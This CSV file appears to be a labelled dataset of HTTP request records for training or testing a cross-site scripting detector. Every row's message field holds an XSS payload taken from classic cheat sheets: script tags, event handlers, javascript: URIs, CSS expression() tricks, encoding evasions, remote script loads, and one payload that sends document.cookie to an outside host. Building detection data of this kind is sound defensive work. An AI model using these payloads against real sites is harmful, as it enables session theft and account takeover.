mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"text/html, image/png, application/json, image/jpeg, */*",257124273598316626,http://127.0.0.1:5000/balance/ubb1rjij,10.159.167.4,15403,POST,Opera/9.26 (Windows NT 5.1; U; nl),"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",true
"text/html, */*",7559446253038233404,http://127.0.0.1:5000/balance/yjy327lz,10.176.68.123,6759,GET,Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8),"<a href=""javascript#document.vulnerable=true;"">",true
"text/html, */*",6941145981549194876,http://127.0.0.1:5000/account/ef0adp9z,10.152.249.223,99019,POST,Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.7) Gecko/20060830 Firefox/1.5.0.7 (Debian-1.5.dfsg+1.5.0.7-1~bpo.1),"<div onmouseover=""document.vulnerable=true;"">",true
"text/html, */*",3067472813602671245,http://127.0.0.1:5000/dividend/3ipbemi6,10.75.51.235,79489,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/526.3 (KHTML, like Gecko) Chrome/14.0.564.21 Safari/526.3","<img src=""javascript:document.vulnerable=true;"">",true
"text/plain, image/png, text/html, */*",212687958236069148,http://127.0.0.1:5000/interest/i69x2i1g,172.24.215.255,25162,GET,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.02  [en],"<img dynsrc=""javascript:document.vulnerable=true;"">",true
"image/jpeg, text/html, */*",1527935720242231400,http://127.0.0.1:5000/dividend/13omzzaw,10.106.79.244,61775,GET,Mozilla/4.0 (compatible; MSIE 4.0; Windows 95),"<input type=""image"" dynsrc=""javascript:document.vulnerable=true;"">",true
"text/plain, image/jpeg, text/html, */*",2536563258101157973,http://127.0.0.1:5000/market/h9zckfsg,10.227.10.109,56960,GET,Opera/9.02 (Windows NT 5.1; U; en),"<bgsound src=""javascript:document.vulnerable=true;"">",true
"image/jpeg, */*",6337526886498372778,http://127.0.0.1:5000/credit/8riru18g,10.247.74.232,12707,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; it-it) AppleWebKit/525.18 (KHTML, like Gecko)",&<script>document.vulnerable=true;</script>,true
"image/jpeg, */*",4205161974884290490,http://127.0.0.1:5000/withdrawal/sc3l0dlc,10.83.140.77,60181,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; pt-br) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13",&{document.vulnerable=true;};,true
"text/plain, text/html, */*",6208570440467940185,http://127.0.0.1:5000/invest/6ytnvd2l,10.251.180.182,86567,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,<img src=&{document.vulnerable=true;};>,true
"text/plain, application/json, image/png, image/jpeg, */*",6302928794699695024,http://127.0.0.1:5000/account/wqdymnse,10.123.32.6,46993,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412.7 (KHTML, like Gecko) Safari/412.5_Adobe","<link rel=""stylesheet"" href=""javascript:document.vulnerable=true;"">",true
"application/json, text/html, image/jpeg, text/plain, */*",432144648674143431,http://127.0.0.1:5000/dividend/r0x7ged3,10.188.150.187,37022,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; fi-fi) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9","<iframe src=""vbscript:document.vulnerable=true;"">",true
"text/html, image/jpeg, */*",4301962700509415444,http://127.0.0.1:5000/market/7ldtz0w2,10.38.162.57,81907,GET,Opera/8.52 (Windows ME; U; en),"<img src=""mocha:document.vulnerable=true;"">",true
"image/png, */*",8676090518316770080,http://127.0.0.1:5000/deposit/v46jsv10,10.110.61.23,84586,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582","<img src=""livescript:document.vulnerable=true;"">",true
"application/json, image/png, text/html, */*",7185798756062896352,http://127.0.0.1:5000/fund/qg2or6j4,10.96.97.0,22274,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<a href=""about:<script>document.vulnerable=true;</script>"">",true
"text/plain, application/json, image/png, image/jpeg, */*",6707686369308393736,http://127.0.0.1:5000/account/tddiux2n,10.83.45.91,50739,POST,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0),"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",true
"image/png, image/jpeg, application/json, */*",788384806839300418,http://127.0.0.1:5000/interest/962zf0l4,10.69.100.201,28142,POST,Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.6) Gecko/20050226 Firefox/1.0.1,"<body onload=""document.vulnerable=true;"">",true
"application/json, text/plain, */*",1622165704336206739,http://127.0.0.1:5000/account/yjj3smn3,10.250.32.80,32127,POST,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100403 Firefox/3.6.3,"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",true
"image/png, text/plain, image/jpeg, */*",2562613052473949126,http://127.0.0.1:5000/mortgage/c7zl4yzq,10.96.187.118,81485,POST,Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0),"<div style=""behaviour: url([link to code]);"">",true
"image/jpeg, image/png, text/plain, text/html, */*",8415340487626526888,http://127.0.0.1:5000/market/c1h7z7dr,10.17.177.86,12944,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27","<div style=""binding: url([link to code]);"">",true
"image/png, image/jpeg, */*",1219907182820304902,http://127.0.0.1:5000/loan/x8lpk3h3,10.67.120.49,80249,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,"<div style=""width: expression(document.vulnerable=true;);"">",true
"application/json, image/png, text/html, image/jpeg, */*",3554126509765861593,http://127.0.0.1:5000/fund/9m0sozy4,10.100.101.48,82769,POST,"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5","<style type=""text/javascript"">document.vulnerable=true;</style>",true
"text/plain, application/json, */*",1614118131632201343,http://127.0.0.1:5000/invest/mvt1gfv2,10.205.19.162,9827,POST,Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC),"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",true
"application/json, text/plain, image/jpeg, text/html, */*",7812662890461657749,http://127.0.0.1:5000/deposit/n7oy875b,10.197.92.101,49475,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,<style><!--</style><script>document.vulnerable=true;//--></script>,true
"application/json, */*",3698046595311813479,http://127.0.0.1:5000/mortgage/hxz7dzrz,10.36.168.180,43868,OPTIONS,Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.12  [it],<<script>document.vulnerable=true;</script>,true
"text/html, image/jpeg, image/png, */*",8640914493140180971,http://127.0.0.1:5000/fund/jm8nmird,10.4.164.91,59427,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/412.7 (KHTML, like Gecko) Safari/412.5",<![<!--]]<script>document.vulnerable=true;//--></script>,true
"application/json, text/html, image/png, */*",5999633809930146002,http://127.0.0.1:5000/market/h3nzjmb0,10.109.121.45,79327,POST,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20100101 Firefox/4.0b7,<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,true
"application/json, image/jpeg, */*",1003948419676474252,http://127.0.0.1:5000/stock/egd6wxdw,10.137.3.11,42548,POST,Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre,"<img src=""blah""onmouseover=""document.vulnerable=true;"">",true
"text/html, application/json, image/jpeg, */*",6685032297323212705,http://127.0.0.1:5000/account/y1yl6m4b,10.192.47.83,91521,GET,"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1","<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",true
"image/png, image/jpeg, */*",5089924529725444888,http://127.0.0.1:5000/stock/gr3pqir9,10.191.164.46,95281,DELETE,Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1 (.NET CLR 3.5.30729),"<xml src=""javascript:document.vulnerable=true;"">",true
"text/plain, text/html, application/json, */*",1785492720908066063,http://127.0.0.1:5000/fund/yahrlu5j,10.78.148.113,38609,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<xml id=""X""><a><b><script>document.vulnerable=true;</script>;</b></a></xml>",true
"application/json, image/jpeg, */*",2708980074927101940,http://127.0.0.1:5000/invest/e8d26x9w,10.215.229.24,31908,POST,Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1,"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",true
"text/plain, text/html, */*",2614223811562076215,http://127.0.0.1:5000/deposit/x8ouweq6,10.212.114.62,40292,POST,Mozilla/5.0 (Windows NT 6.3; WOW64; rv:71.0) Gecko/20100101 Firefox/71.0,[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,true
"image/png, image/jpeg, application/json, */*",6311233842521584832,http://127.0.0.1:5000/interest/vjsm2f4k,10.17.42.141,86732,POST,Opera/7.53 (Windows NT 5.1; U)  [en],<style>@import'http://www.securitycompass.com/xss.css';</style>,true
"application/json, text/html, */*",7442405777333878796,http://127.0.0.1:5000/loan/3oxls26m,10.47.135.231,66165,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-ca) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12","<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",true
"image/png, text/plain, text/html, */*",5257565009594997729,http://127.0.0.1:5000/credit/yhast0an,10.143.104.243,13963,POST,Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320)Opera 8.65 [en],"<style>BODY{-moz-binding:url(""http://www.securitycompass.com/xssmoz.xml#xss"")}</style>",true
"text/html, application/json, text/plain, image/jpeg, */*",3575038735554340133,http://127.0.0.1:5000/capital/94ylcsho,10.224.156.230,14871,GET,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",true
"text/html, text/plain, application/json, */*",7202158922410140763,http://127.0.0.1:5000/loan/29uf3mzy,10.182.105.148,74589,POST,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0),"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://www.securitycompass.com/xss.htc""><xss:xss>XSS</xss:xss></html>",true
"text/html, image/png, application/json, text/plain, */*",5483312484516385313,http://127.0.0.1:5000/transaction/bipm7b3u,10.128.204.2,28970,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.17","<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",true
"image/jpeg, */*",4598563516873033542,http://127.0.0.1:5000/interest/1v7bnu3b,10.116.123.204,84352,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/4.0.1 Safari/530.18","<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'""-->",true
"image/jpeg, application/json, */*",5393658679226189893,http://127.0.0.1:5000/loan/fi8uka66,10.145.58.74,35485,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577","<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",true
"image/jpeg, application/json, image/png, */*",740393163308044504,http://127.0.0.1:5000/invest/ilkvnl1v,10.66.170.23,50786,GET,Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30),"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",true
"image/jpeg, text/html, application/json, text/plain, */*",2954777571314108603,http://127.0.0.1:5000/interest/w4aak1xg,10.121.97.83,80213,GET,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.51  [en],"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",true
"image/png, application/json, text/html, */*",8826586193600644189,http://127.0.0.1:5000/portfolio/fuyxd50t,10.150.56.252,85044,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.2; ru-RU) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13.3","<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",true
"image/png, */*",6458353616371935954,http://127.0.0.1:5000/portfolio/0lr3vjdo,10.84.193.78,94159,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",true
"image/jpeg, text/plain, */*",1030419007651265752,http://127.0.0.1:5000/balance/w868wp1t,10.51.73.195,63973,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<script a="">'>"" SRC=""http://www.securitycompass.com/xss.js""></script>",true
"image/jpeg, */*",690647987409845986,http://127.0.0.1:5000/account/5od2u3i4,10.23.186.76,11646,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582","<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",true
"application/json, */*",8578864521602211493,http://127.0.0.1:5000/deposit/61zgwn95,10.244.117.33,41227,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.10) Gecko/2009042523 Linux Mint/7 (Gloria) Firefox/3.0.10,"<div style=""binding: url(http://www.securitycompass.com/xss.js);""> [Mozilla]",true
"image/jpeg, application/json, */*",2523051002004291752,http://127.0.0.1:5000/mortgage/brtoi27v,10.70.207.80,76477,GET,Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9,"&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;",true
"application/json, text/plain, image/png, image/jpeg, */*",3538367876566936004,http://127.0.0.1:5000/credit/7bgefm0n,10.109.13.55,13204,GET,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.10) Gecko/20071115 Firefox/2.0.0.10,&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;,true
"text/plain, */*",4808718241017313485,http://127.0.0.1:5000/credit/qqb0a24p,10.209.123.23,51137,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",&lt;/br style=a:expression(alert())&gt;,true
"text/html, text/plain, */*",2803326337146639154,http://127.0.0.1:5000/fund/u0nrsw35,10.18.205.65,15384,POST,"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.91 Chromium/12.0.742.91 Safari/534.30",&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;,true
"text/plain, */*",2117627402507798045,http://127.0.0.1:5000/loan/428y95l4,10.193.250.246,30833,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;,true
"application/json, text/html, image/jpeg, image/png, */*",6805656297027074914,http://127.0.0.1:5000/account/ukhc3t0i,10.132.89.183,63126,POST,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200,perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out,true
"application/json, text/html, image/png, image/jpeg, */*",8579177158080480847,http://127.0.0.1:5000/capital/c27j1zxe,10.36.214.110,12066,CONNECT,Opera/7.11 (Windows NT 5.1; U)  [en],perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out,true
"application/json, image/jpeg, image/png, */*",1138598466876384359,http://127.0.0.1:5000/deposit/26x98dbo,10.71.165.122,84612,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5",<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,true
"text/html, text/plain, image/png, image/jpeg, */*",2311935286440733068,http://127.0.0.1:5000/market/4j916xfc,10.150.85.143,52390,POST,Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00,"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",true
"text/plain, image/jpeg, image/png, */*",4206710221345390321,http://127.0.0.1:5000/transaction/jrwm6epf,10.250.233.36,7575,GET,Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1),<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,true
"image/png, text/plain, image/jpeg, application/json, */*",8244441884152531727,http://127.0.0.1:5000/account/j0kcijiy,10.233.77.175,67092,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; it-it) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1",<~/XSS STYLE=xss:expression(alert('XSS'))>,true
"text/html, application/json, image/jpeg, image/png, */*",3322046677577578074,http://127.0.0.1:5000/credit/yn299hqh,10.225.39.77,41108,POST,Mozilla/5.0 (Windows; U; Windows NT 5.2;  rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11,"""><script>alert('XSS')</script>",true
"text/html, application/json, image/jpeg, */*",9208873345326155996,http://127.0.0.1:5000/deposit/ylxnoz3o,10.79.158.17,43426,OPTIONS,Mozilla/5.0 (X11; U; Linux x86_64; fi-FI; rv:1.9.0.8) Gecko/2009032712 Ubuntu/8.10 (intrepid) Firefox/3.0.8,</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,true
"text/plain, */*",7857504345315982481,http://127.0.0.1:5000/portfolio/jnb1d3qq,10.32.18.192,20998,POST,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0),XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,true
"image/png, */*",5095431419519225303,http://127.0.0.1:5000/dividend/fhf6e341,10.44.78.236,90546,POST,Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618),XSS STYLE=xss:e/**/xpression(alert('XSS'))>,true
"text/html, */*",7221277665060692730,http://127.0.0.1:5000/credit/uqdl65ip,10.28.206.74,30486,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",</XSS STYLE=xss:expression(alert('XSS'))>,true
"image/jpeg, */*",7692245683958811687,http://127.0.0.1:5000/interest/pxik9nsz,172.22.119.92,22036,POST,Opera/9.62 (Windows NT 5.1; U; pt-BR) Presto/2.1.1,"';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//"";;alert(String.fromCharCode(88,83,83))//\"";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;"";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",true
"image/png, image/jpeg, */*",3304899081764326143,http://127.0.0.1:5000/account/tekns09u,10.190.99.98,99512,POST,Mozilla/5.0 (X11; U; SunOS sun4u; it-IT; ) Gecko/20080000 Firefox/3.0,"';';;!--"";<;XSS>;=&;{()}",true
"text/html, */*",6987517254949861655,http://127.0.0.1:5000/credit/omdchjvi,10.42.198.47,16460,POST,Opera/9.23 (Windows NT 5.1; U; zh-cn),<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,true
"application/json, text/html, image/jpeg, */*",7375851776282543201,http://127.0.0.1:5000/market/v8hrdmuh,10.218.192.118,83080,POST,Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0,<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;,true
"text/plain, image/jpeg, image/png, */*",7440255073244612351,http://127.0.0.1:5000/balance/gy8w6mmn,10.116.0.19,15211,GET,Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 98) Opera 7.0  [en],"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",true
"image/png, application/json, */*",3175202217040087794,http://127.0.0.1:5000/transaction/58vpd28x,10.173.241.96,46031,POST,Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.2) Gecko/20060601 Firefox/2.0.0.2 (Ubuntu-edgy),"<;BASE HREF="";javascript:alert(';XSS';);//"";>;",true
"text/html, image/jpeg, */*",4837502239881112570,http://127.0.0.1:5000/transaction/5dex2v0q,10.209.89.150,78416,POST,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200,"<;BGSOUND SRC="";javascript:alert(';XSS';);"";>;",true
"image/png, application/json, */*",3654737022294911202,http://127.0.0.1:5000/stock/e55kqicv,10.222.134.170,37446,PUT,Opera/6.05 (Windows 98; U)  [fr],"<;BODY BACKGROUND="";javascript:alert(';XSS';);"";>;",true
"text/plain, */*",3008931997466523050,http://127.0.0.1:5000/mortgage/0f0f2mzy,10.194.243.102,30164,POST,Opera/9.20 (Windows NT 5.1; U; MEGAUPLOAD=1.0; es-es),<;BODY ONLOAD=alert(';XSS';)>;,true
"image/png, text/html, text/plain, */*",6081913575247110794,http://127.0.0.1:5000/withdrawal/019x46f6,10.33.29.116,86894,POST,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.13; ko; rv:1.9.1b2) Gecko/20081201 Firefox/60.0,"<;DIV STYLE="";background-image: url(javascript:alert(';XSS';))"";>;",true
"application/json, image/png, image/jpeg, */*",4736683791707404942,http://127.0.0.1:5000/transaction/gszc8ju8,10.31.158.200,85855,POST,Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.3) Gecko/20070410 Firefox/2.0.0.3,"<;DIV STYLE="";background-image: url(&;#1;javascript:alert(';XSS';))"";>;",true
"image/jpeg, text/plain, */*",3243138079065224017,http://127.0.0.1:5000/loan/z6b3xcnn,10.119.157.201,17762,POST,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8","<;DIV STYLE="";width: expression(alert(';XSS';));"";>;",true
"text/plain, text/html, application/json, */*",621946684500548230,http://127.0.0.1:5000/interest/sjm57sng,10.43.224.171,51868,POST,Opera/9.21 (Windows NT 5.1; U; MEGAUPLOAD 1.0; en),"<;FRAMESET>;<;FRAME SRC="";javascript:alert(';XSS';);"";>;<;/FRAMESET>;",true
"image/png, application/json, */*",8683807166782152332,http://127.0.0.1:5000/transaction/jc1stiqg,10.231.124.112,76655,GET,Mozilla/5.0 (X11; U; Linux i686; hu-HU; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7),"<;IFRAME SRC="";javascript:alert(';XSS';);"";>;<;/IFRAME>;",true
"application/json, text/plain, image/png, image/jpeg, */*",3149465099631474839,http://127.0.0.1:5000/withdrawal/5tu5g6vf,10.253.233.240,82938,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5","<;INPUT TYPE="";IMAGE""; SRC="";javascript:alert(';XSS';);"";>;",true
"application/json, image/jpeg, */*",6109567762241124259,http://127.0.0.1:5000/loan/culpa0yn,10.221.138.52,93962,POST,Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt),"<;IMG SRC="";javascript:alert(';XSS';);"";>;",true
"text/plain, */*",2441950794344641175,http://127.0.0.1:5000/credit/fzcb95mo,10.78.67.235,72887,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",<;IMG SRC=javascript:alert(';XSS';)>;,true
"application/json, */*",32553213204033989,http://127.0.0.1:5000/credit/gv9wnpij,10.60.179.145,67576,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; en-us) AppleWebKit/525.7 (KHTML, like Gecko) Version/3.1 Safari/525.7","<;IMG DYNSRC="";javascript:alert(';XSS';);"";>;",true
"image/png, application/json, image/jpeg, */*",7023988974000386022,http://127.0.0.1:5000/capital/fuwvwb32,10.225.42.74,38769,POST,Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9a2) Gecko/20080530 Firefox/3.0a2,"<;IMG LOWSRC="";javascript:alert(';XSS';);"";>;",true
"text/plain, */*",7075586621944497613,http://127.0.0.1:5000/portfolio/6xeim8ku,10.53.25.13,7705,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27","<;IMG SRC="";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"";>;",true
"image/jpeg, */*",4999229603589865311,http://127.0.0.1:5000/debit/nlfsueec,10.214.206.147,92882,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-ch) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12",Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser,true
